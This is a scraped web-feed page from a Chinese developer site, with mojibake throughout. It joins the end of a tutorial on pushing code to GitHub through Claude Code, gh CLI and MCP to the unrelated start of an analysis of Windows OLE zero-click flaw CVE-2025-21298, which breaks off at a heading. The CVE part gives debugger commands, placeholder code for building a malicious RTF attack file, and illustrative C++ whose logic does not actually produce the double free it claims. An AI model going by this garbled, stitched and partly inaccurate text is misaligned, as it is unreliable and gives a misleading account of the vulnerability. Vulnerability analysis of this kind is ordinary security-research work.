<p><strong>åˆ†æ­¥æ‰§è¡Œ</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"å¸®æˆ‘å®‰è£… GitHub CLI"</span>
<span class="hljs-string">"å¸®æˆ‘ç™»å½• GitHub"</span>
<span class="hljs-string">"å¸®æˆ‘åˆ›å»ºä»“åº“å¹¶æ¨é€"</span>
</code></pre>
<h3 data-id="heading-15">å®é™…å¯¹è¯æ¼”ç¤º</h3>
<p>ä»¥ä¸‹æ˜¯æœ¬æ–‡çš„çœŸå®æ“ä½œè®°å½•ï¼š</p>
<hr/>
<p><strong>æˆ‘</strong>ï¼šå¸®æˆ‘æŠŠé¡¹ç›®æ¨é€åˆ° GitHub</p>
<p><strong>Claude</strong>ï¼šè®©æˆ‘å…ˆå®‰è£… gh CLIã€‚</p>
<pre><code class="hljs language-bash" lang="bash">brew install gh
</code></pre>
<p><strong>Claude</strong>ï¼šè¯·åœ¨æµè§ˆå™¨æ‰“å¼€ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flogin%2Fdevice" target="_blank" title="https://github.com/login/device" ref="nofollow noopener noreferrer">github.com/login/devicâ€¦</a> è¾“å…¥éªŒè¯ç ï¼š<code>9F6D-76C8</code></p>
<p><strong>æˆ‘</strong>ï¼šå¥½äº†</p>
<p><strong>Claude</strong>ï¼šè®¤è¯æˆåŠŸï¼Œæ­£åœ¨åˆ›å»ºä»“åº“å¹¶æ¨é€ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">gh repo create azhe_project --public --<span class="hljs-built_in">source</span>=. --remote=github --push
</code></pre>
<p><strong>Claude</strong>ï¼šå®Œæˆï¼ä»“åº“åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F15811079534%2Fazhe_project" target="_blank" title="https://github.com/15811079534/azhe_project" ref="nofollow noopener noreferrer">github.com/15811079534â€¦</a></p>
<hr/>
<h3 data-id="heading-16">æ›´å¤šåœºæ™¯</h3>
<pre><code class="hljs language-sql" lang="sql">"å¸®æˆ‘æäº¤ä»£ç "           â†’ AI è‡ªåŠ¨ <span class="hljs-keyword">add</span>ã€ç”Ÿæˆ <span class="hljs-keyword">commit</span> messageã€<span class="hljs-keyword">commit</span>
"å¸®æˆ‘åˆ›å»º PR"            â†’ AI æ‰§è¡Œ gh pr <span class="hljs-keyword">create</span>
"å¸®æˆ‘çœ‹çœ‹æœ‰å“ªäº› Issue"    â†’ AI æ‰§è¡Œ gh issue list å¹¶æ€»ç»“
"å¸®æˆ‘å›æ»šåˆ°ä¸Šä¸€ä¸ªç‰ˆæœ¬"    â†’ AI æ‰§è¡Œ git revert
</code></pre>
<h3 data-id="heading-17">å°ç»“</h3>
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šé›¶è®°å¿†è´Ÿæ‹…ï¼Œè¯´äººè¯å°±è¡Œï¼Œä¸€æ¬¡é…ç½®æ°¸ä¹…ä½¿ç”¨</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šéœ€è¦ Claude Code å’Œ API è®¿é—®</li>
</ul>
<hr/>
<h2 data-id="heading-18">æ–¹å¼ä¸‰ï¼šMCPï¼ˆè¿›é˜¶ï¼‰</h2>
<p>MCP (Model Context Protocol) è®© AI ç›´æ¥è°ƒç”¨ GitHub APIï¼Œè·³è¿‡å‘½ä»¤è¡Œã€‚</p>
<h3 data-id="heading-19">ä¸ gh CLI çš„åŒºåˆ«</h3>
<pre><code class="hljs language-objectivec" lang="objectivec">gh <span class="hljs-built_in">CLI</span> æ–¹å¼ï¼šAI â†’ shell å‘½ä»¤ â†’ gh <span class="hljs-built_in">CLI</span> â†’ GitHub API
MCP æ–¹å¼ï¼š  AI â†’ MCP Server â†’ GitHub APIï¼ˆæ›´ç›´æ¥ï¼‰
</code></pre>
<h3 data-id="heading-20">é…ç½®æ­¥éª¤</h3>
<p><strong>1. åˆ›å»º GitHub Token</strong></p>
<p>æ‰“å¼€ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsettings%2Ftokens" target="_blank" title="https://github.com/settings/tokens" ref="nofollow noopener noreferrer">github.com/settings/toâ€¦</a> â†’ Generate new token â†’ å‹¾é€‰ <code>repo</code> æƒé™</p>
<p><strong>2. é…ç½® Claude Code</strong></p>
<p>ç¼–è¾‘ <code>~/.claude/settings.json</code>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcpServers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"github"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npx"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"-y"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"@modelcontextprotocol/server-github"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"env"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"GITHUB_PERSONAL_ACCESS_TOKEN"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ghp_ä½ çš„token"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>3. é‡å¯ Claude Code</strong></p>
<h3 data-id="heading-21">é€‚ç”¨åœºæ™¯</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"å¸®æˆ‘ fork è¿™ä¸ªä»“åº“"</span>
<span class="hljs-string">"å¸®æˆ‘çœ‹çœ‹ owner/repo çš„ README"</span>
<span class="hljs-string">"åœ¨ owner/repo åˆ›å»ºä¸€ä¸ª Issue"</span>
</code></pre>
<h3 data-id="heading-22">å°ç»“</h3>
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šç›´æ¥è°ƒç”¨ APIï¼Œé€Ÿåº¦å¿«ï¼Œé€‚åˆæ‰¹é‡æ“ä½œ</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šä¸æ”¯æŒæœ¬åœ° Git æ“ä½œï¼ˆpush/pullï¼‰ï¼Œé…ç½®è¾ƒå¤æ‚</li>
</ul>
<hr/>
<h2 data-id="heading-23">æ¨èæ–¹æ¡ˆ</h2>

























<table><thead><tr><th>ç”¨æˆ·ç±»å‹</th><th>æ¨èæ–¹å¼</th><th>ç†ç”±</th></tr></thead><tbody><tr><td><strong>å¤§å¤šæ•°å¼€å‘è€…</strong></td><td>Claude Code + gh CLI</td><td>ç®€å•ã€å®Œæ•´ã€ä¸€æ¬¡é…ç½®æ°¸ä¹…ä½¿ç”¨</td></tr><tr><td>å–œæ¬¢å‘½ä»¤è¡Œ</td><td>çº¯ gh CLI</td><td>ç²¾ç¡®æ§åˆ¶</td></tr><tr><td>æ‰¹é‡è¿œç¨‹æ“ä½œ</td><td>é¢å¤–é…ç½® MCP</td><td>é€Ÿåº¦æ›´å¿«</td></tr></tbody></table>
<p><strong>æœ¬æ–‡æ¨è</strong>ï¼šClaude Code + gh CLIï¼Œå…¼é¡¾æ˜“ç”¨æ€§å’ŒåŠŸèƒ½å®Œæ•´æ€§ã€‚</p>
<hr/>
<h2 data-id="heading-24">æ€»ç»“</h2>
<p><strong>æ ¸å¿ƒæ”¶ç›Š</strong>ï¼š</p>
<ol>
<li>ä¸€å¥è¯æ¨é€ä»£ç åˆ° GitHub</li>
<li>ä¸€æ¬¡é…ç½®ï¼Œæ°¸ä¹…ä½¿ç”¨</li>
<li>ä¸ç”¨è®°ä»»ä½•å‘½ä»¤</li>
</ol>
<p><strong>è¡ŒåŠ¨æ­¥éª¤</strong>ï¼š</p>
<ol>
<li><code>brew install gh</code> - å®‰è£… GitHub CLI</li>
<li><code>gh auth login</code> - ç™»å½•ï¼ˆä»…æ­¤ä¸€æ¬¡ï¼‰</li>
<li><code>npm install -g @anthropic-ai/claude-code</code> - å®‰è£… Claude Code</li>
<li>ä»¥åä»»ä½•é¡¹ç›®ï¼Œç›´æ¥è¯´"å¸®æˆ‘æ¨é€åˆ° GitHub"</li>
</ol>
<p>å°±è¿™ä¹ˆç®€å•ã€‚</p>
<hr/>
<h2 data-id="heading-25">å‚è€ƒé“¾æ¥</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcli.github.com%2Fmanual%2F" target="_blank" title="https://cli.github.com/manual/" ref="nofollow noopener noreferrer">GitHub CLI å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.anthropic.com%2Fen%2Fdocs%2Fclaude-code" target="_blank" title="https://docs.anthropic.com/en/docs/claude-code" ref="nofollow noopener noreferrer">Claude Code å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2F" target="_blank" title="https://modelcontextprotocol.io/" ref="nofollow noopener noreferrer">MCP å®˜æ–¹æ–‡æ¡£</a></li>
</ul>
<hr/>
<blockquote>
<p>ä½œè€…ï¼šaZhe
å¦‚æœ‰é—®é¢˜æ¬¢è¿ç•™è¨€äº¤æµ</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥è§£æWindows OLEé«˜å±æ¼æ´CVE-2025-21298ï¼šé›¶ç‚¹å‡»è¿œç¨‹ä»£ç æ‰§è¡Œ]]></title>    <link>https://juejin.cn/post/7600764857770164274</link>    <guid>https://juejin.cn/post/7600764857770164274</guid>    <pubDate>2026-01-30T07:32:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600764857770164274" data-draft-id="7600764857770115122" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥è§£æWindows OLEé«˜å±æ¼æ´CVE-2025-21298ï¼šé›¶ç‚¹å‡»è¿œç¨‹ä»£ç æ‰§è¡Œ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-01-30T07:32:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥è§£æWindows OLEé«˜å±æ¼æ´CVE-2025-21298ï¼šé›¶ç‚¹å‡»è¿œç¨‹ä»£ç æ‰§è¡Œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T07:32:08.000Z" title="Fri Jan 30 2026 07:32:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">CVE-2025-21298 â€“ Microsoft Windows OLEé›¶ç‚¹å‡»è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ</h2>
<h3 data-id="heading-1">ğŸ“Œ é¡¹ç›®æ¦‚è¿°</h3>
<p>æœ¬åˆ†ææŠ¥å‘Šè¯¦ç»†å‰–æäº†Microsoft Windows OLEç»„ä»¶ä¸­çš„ä¸€ä¸ªä¸¥é‡å®‰å…¨æ¼æ´CVE-2025-21298ã€‚è¯¥æ¼æ´å­˜åœ¨äº<code>ole32.dll</code>åº“çš„<code>UtOlePresStmToContentsStm</code>å‡½æ•°ä¸­ï¼Œæ˜¯ä¸€ä¸ªåŒé‡é‡Šæ”¾å†…å­˜ç ´åæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡ç‰¹åˆ¶çš„RTFæ–‡ä»¶ï¼Œå¯åœ¨å—å®³è€…é¢„è§ˆé‚®ä»¶æ—¶è§¦å‘æ¼æ´ï¼Œå®ç°é›¶ç‚¹å‡»è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
<p><strong>å…³é”®ä¿¡æ¯ï¼š</strong></p>
<ul>
<li><strong>æ¼æ´ç±»å‹</strong>ï¼šåŒé‡é‡Šæ”¾å†…å­˜ç ´å</li>
<li><strong>å½±å“ç»„ä»¶</strong>ï¼šMicrosoft Windows OLE (Object Linking and Embedding) â€“ å…·ä½“åœ¨<code>ole32.dll</code></li>
<li><strong>å—å½±å“å‡½æ•°</strong>ï¼š<code>UtOlePresStmToContentsStm</code></li>
<li><strong>ä¸¥é‡ç­‰çº§</strong>ï¼šCVSS 3.1è¯„åˆ† <strong>9.8</strong> â€“ å…³é”®çº§</li>
<li><strong>æ”»å‡»å‘é‡</strong>ï¼šç‰¹åˆ¶RTFæ–‡ä»¶</li>
<li><strong>äº¤äº’éœ€æ±‚</strong>ï¼šé›¶ç‚¹å‡»ï¼ˆé¢„è§ˆæ—¶è§¦å‘ï¼‰</li>
<li><strong>ä¸»è¦ç›®æ ‡</strong>ï¼šOutlookç”¨æˆ·åŠå…¶ä»–æ”¯æŒOLEçš„åº”ç”¨ç¨‹åºï¼ˆå¦‚Wordï¼‰</li>
</ul>
<h3 data-id="heading-2">âš™ï¸ åŠŸèƒ½ç‰¹æ€§</h3>
<h4 data-id="heading-3">æ¼æ´åˆ†æåŠŸèƒ½</h4>
<ul>
<li><strong>å†…å­˜ç®¡ç†ç¼ºé™·è¯†åˆ«</strong>ï¼šåˆ†æWindows OLEç»„ä»¶åœ¨RTFæ–‡ä»¶å¤„ç†æ—¶çš„å†…å­˜ç®¡ç†é”™è¯¯</li>
<li><strong>åŒé‡é‡Šæ”¾è·¯å¾„è¿½è¸ª</strong>ï¼šè¯¦ç»†è¿½è¸ª<code>pstmContents</code>æŒ‡é’ˆåœ¨ç‰¹å®šæ¡ä»¶ä¸‹çš„åŒé‡é‡Šæ”¾è¿‡ç¨‹</li>
<li><strong>æ”»å‡»å‘é‡è¿˜åŸ</strong>ï¼šé‡æ„é€šè¿‡æ¶æ„RTFæ–‡ä»¶åˆ©ç”¨OLEç»“æ„çš„æŠ€æœ¯è·¯å¾„</li>
</ul>
<h4 data-id="heading-4">æŠ€æœ¯æ·±åº¦åˆ†æ</h4>
<ul>
<li><strong>é›¶ç‚¹å‡»æ¼æ´æœºåˆ¶</strong>ï¼šæ·±å…¥åˆ†ææ— éœ€ç”¨æˆ·äº¤äº’å³å¯è§¦å‘çš„æ¼æ´æ‰§è¡Œæœºåˆ¶</li>
<li><strong>é‚®ä»¶æ”»å‡»åœºæ™¯</strong>ï¼šé’ˆå¯¹Outlooké‚®ä»¶é¢„è§ˆåœºæ™¯çš„ä¸“é¡¹å®‰å…¨åˆ†æ</li>
<li><strong>ç³»ç»Ÿå…¼å®¹æ€§è¯„ä¼°</strong>ï¼šè¦†ç›–ä»Windows 10åˆ°Windows Server 2025çš„å¹¿æ³›ç³»ç»Ÿç‰ˆæœ¬</li>
</ul>
<h4 data-id="heading-5">å®‰å…¨ç ”ç©¶ä»·å€¼</h4>
<ul>
<li><strong>å®æˆ˜æ¼æ´ç ”ç©¶</strong>ï¼šçœŸå®ä¸–ç•Œä¸­çš„é«˜å±å®³é›¶ç‚¹å‡»æ¼æ´åˆ†ææ¡ˆä¾‹</li>
<li><strong>è¡¥ä¸å½±å“è¯„ä¼°</strong>ï¼šåˆ†æå¾®è½¯2025å¹´1æœˆå®‰å…¨æ›´æ–°çš„ä¿®å¤æ•ˆæœ</li>
<li><strong>ä¼ä¸šçº§é˜²æŠ¤å»ºè®®</strong>ï¼šæä¾›å¤šå±‚æ¬¡çš„ç¼“è§£æªæ–½å’Œé˜²æŠ¤ç­–ç•¥</li>
</ul>
<h3 data-id="heading-6">ğŸ’» å®‰è£…ä¸è¿è¡Œ</h3>
<h4 data-id="heading-7">ç¯å¢ƒè¦æ±‚</h4>
<ul>
<li><strong>æ“ä½œç³»ç»Ÿ</strong>ï¼šå—å½±å“ç‰ˆæœ¬çš„Windowsç³»ç»Ÿï¼ˆç”¨äºéªŒè¯åˆ†æï¼‰</li>
<li><strong>åˆ†æå·¥å…·</strong>ï¼š
<ul>
<li>IDA Proæˆ–Ghidraï¼ˆåæ±‡ç¼–åˆ†æï¼‰</li>
<li>WinDbgæˆ–x64dbgï¼ˆåŠ¨æ€è°ƒè¯•ï¼‰</li>
<li>RTFæ–‡ä»¶åˆ†æå·¥å…·</li>
</ul>
</li>
<li><strong>å®‰å…¨ç¯å¢ƒ</strong>ï¼šå»ºè®®åœ¨éš”ç¦»çš„è™šæ‹Ÿç¯å¢ƒä¸­è¿›è¡Œåˆ†æ</li>
</ul>
<h4 data-id="heading-8">é…ç½®è¯´æ˜</h4>
<ol>
<li>
<p><strong>è·å–å—å½±å“ç»„ä»¶</strong>ï¼š</p>
<ul>
<li>ä»å—å½±å“Windowsç‰ˆæœ¬æå–<code>ole32.dll</code>æ–‡ä»¶</li>
<li>ç¡®ä¿è·å–æ­£ç¡®ç‰ˆæœ¬ä»¥åŒ¹é…æ¼æ´å­˜åœ¨æ¡ä»¶</li>
</ul>
</li>
<li>
<p><strong>è®¾ç½®åˆ†æç¯å¢ƒ</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºéš”ç¦»çš„æµ‹è¯•ç¯å¢ƒ</span>
<span class="hljs-comment"># å®‰è£…å¿…è¦çš„è°ƒè¯•å’Œåˆ†æå·¥å…·</span>
</code></pre>
</li>
<li>
<p><strong>å‡†å¤‡æµ‹è¯•ç”¨ä¾‹</strong>ï¼š</p>
<ul>
<li>æ„é€ ç¬¦åˆæ¼æ´è§¦å‘æ¡ä»¶çš„RTFæ ·æœ¬æ–‡ä»¶</li>
<li>é…ç½®Outlookæˆ–å…¶ä»–OLEåº”ç”¨ä½œä¸ºæµ‹è¯•ç›®æ ‡</li>
</ul>
</li>
</ol>
<h3 data-id="heading-9">ğŸ“– ä½¿ç”¨è¯´æ˜</h3>
<h4 data-id="heading-10">æ¼æ´å¤ç°æ­¥éª¤</h4>
<ol>
<li>
<p><strong>é™æ€åˆ†æé˜¶æ®µ</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä½¿ç”¨åæ±‡ç¼–å·¥å…·åˆ†æole32.dll</span>
<span class="hljs-comment"># é‡ç‚¹æŸ¥çœ‹UtOlePresStmToContentsStmå‡½æ•°</span>
function_analysis = analyze_function(<span class="hljs-string">"UtOlePresStmToContentsStm"</span>)

<span class="hljs-comment"># è¯†åˆ«å†…å­˜ç®¡ç†ç›¸å…³æ“ä½œ</span>
memory_operations = find_memory_management_patterns()

<span class="hljs-comment"># æ ‡è®°æ½œåœ¨çš„é‡Šæ”¾æ“ä½œç‚¹</span>
free_points = identify_free_operations()
</code></pre>
</li>
<li>
<p><strong>åŠ¨æ€è°ƒè¯•é˜¶æ®µ</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é™„åŠ åˆ°ç›®æ ‡è¿›ç¨‹ï¼ˆå¦‚Outlookï¼‰</span>
windbg -p &lt;outlook_pid&gt;

<span class="hljs-comment"># è®¾ç½®æ–­ç‚¹åœ¨å…³é”®å‡½æ•°</span>
bp ole32!UtOlePresStmToContentsStm

<span class="hljs-comment"># ç›‘æ§å†…å­˜åˆ†é…å’Œé‡Šæ”¾</span>
!heap -<span class="hljs-built_in">stat</span>
</code></pre>
</li>
<li>
<p><strong>æ”»å‡»å‘é‡æ„å»º</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ„å»ºæ¶æ„RTFæ–‡ä»¶ç»“æ„</span>
rtf_structure = {
    <span class="hljs-string">"ole_object"</span>: {
        <span class="hljs-string">"pres_stream"</span>: <span class="hljs-string">"malicious_data"</span>,
        <span class="hljs-string">"contents_stream"</span>: <span class="hljs-string">"exploit_payload"</span>
    },
    <span class="hljs-string">"trigger_conditions"</span>: <span class="hljs-string">"double_free_trigger"</span>
}

<span class="hljs-comment"># åµŒå…¥åˆ°é‚®ä»¶ä¸­æµ‹è¯•</span>
test_email = create_email_with_rtf_attachment(rtf_structure)
</code></pre>
</li>
</ol>
<h4 data-id="heading-11">å…¸å‹åº”ç”¨åœºæ™¯</h4>
<ul>
<li><strong>å®‰å…¨ç ”ç©¶äººå‘˜</strong>ï¼šç”¨äºç†è§£Windows OLEå®‰å…¨æœºåˆ¶å’Œæ¼æ´æ¨¡å¼</li>
<li><strong>ä¼ä¸šå®‰å…¨å›¢é˜Ÿ</strong>ï¼šè¯„ä¼°å†…éƒ¨ç³»ç»Ÿçš„æ¼æ´é£é™©å’Œåˆ¶å®šé˜²æŠ¤ç­–ç•¥</li>
<li><strong>æ¼æ´æŒ–æ˜è€…</strong>ï¼šå­¦ä¹ ç±»ä¼¼æ¼æ´çš„å‘ç°å’Œåˆ†ææ–¹æ³•</li>
</ul>
<h3 data-id="heading-12">ğŸ” æ ¸å¿ƒä»£ç åˆ†æ</h3>
<h4 data-id="heading-13">æ¼æ´å‡½æ•°åˆ†æ</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ole32.dllä¸­çš„æ¼æ´å‡½æ•°ç‰‡æ®µ</span>
<span class="hljs-function">HRESULT <span class="hljs-title">UtOlePresStmToContentsStm</span><span class="hljs-params">(IStream *pstmPres, IStream **ppstmContents)</span>
</span>{
    HRESULT hr = S_OK;
    <span class="hljs-comment">// ... åˆå§‹åŒ–ä»£ç </span>
    
    <span class="hljs-comment">// æ¼æ´ç‚¹ï¼špstmContentsçš„å†…å­˜ç®¡ç†é”™è¯¯</span>
    <span class="hljs-keyword">if</span> (pstmPres != <span class="hljs-literal">NULL</span>)
    {
        <span class="hljs-comment">// ç¬¬ä¸€æ¬¡å†…å­˜åˆ†é…æˆ–è·å–</span>
        *ppstmContents = <span class="hljs-built_in">allocate_or_get_stream</span>();
        
        <span class="hljs-comment">// æŸäº›é”™è¯¯å¤„ç†è·¯å¾„å¯èƒ½å¯¼è‡´åŒé‡é‡Šæ”¾</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))
        {
            <span class="hljs-comment">// é”™è¯¯å¤„ç†ï¼šå¯èƒ½é‡Šæ”¾ppstmContents</span>
            <span class="hljs-keyword">if</span> (*ppstmContents != <span class="hljs-literal">NULL</span>)
            {
                <span class="hljs-comment">// ç¬¬ä¸€ä¸ªé‡Šæ”¾ç‚¹</span>
                (*ppstmContents)-&gt;<span class="hljs-built_in">Release</span>();
                *ppstmContents = <span class="hljs-literal">NULL</span>;
            }
        }
    }
    
    <span class="hljs-comment">// åç»­ä»£ç ä¸­å¯èƒ½å­˜åœ¨å¦ä¸€ä¸ªé‡Šæ”¾æ“ä½œ</span>
    <span class="hljs-keyword">if</span> (some_condition)
    {
        <span class="hljs-comment">// ç¬¬äºŒä¸ªé‡Šæ”¾ç‚¹ï¼ˆæ¼æ´è§¦å‘ï¼‰</span>
        <span class="hljs-keyword">if</span> (*ppstmContents != <span class="hljs-literal">NULL</span>)
        {
            (*ppstmContents)-&gt;<span class="hljs-built_in">Release</span>();  <span class="hljs-comment">// åŒé‡é‡Šæ”¾å‘ç”Ÿï¼</span>
            *ppstmContents = <span class="hljs-literal">NULL</span>;
        }
    }
    
    <span class="hljs-keyword">return</span> hr;
}
</code></pre>
<h4 data-id="heading-14">RTFæ–‡ä»¶è§£æå…³é”®ä»£ç </h4>
